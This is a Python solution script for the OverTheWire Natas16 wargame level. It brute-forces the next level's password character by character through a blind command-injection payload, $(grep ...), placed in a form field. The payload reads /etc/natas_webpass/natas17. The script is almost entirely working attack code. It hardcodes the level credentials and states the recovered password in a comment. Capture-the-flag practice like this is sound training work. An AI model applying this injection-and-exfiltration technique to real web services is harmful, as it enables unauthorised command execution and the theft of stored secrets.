import requests as r

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = 'http://' + username + '.natas.labs.overthewire.org/'

session = r.Session()
#response = session.get(url, auth = (username, password))
cracked = [""]

while(True):
	for c in chars:
		tester = "".join(cracked) + c
		data = {"needle":"Protestants$(grep ^"+ tester +" /etc/natas_webpass/natas17)"}
		response = session.post(url, data, auth = (username, password))
		if("Protestants" not in response.text):
			cracked.append(c)
			print("".join(cracked))
			break


# Run code and get pw -> 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
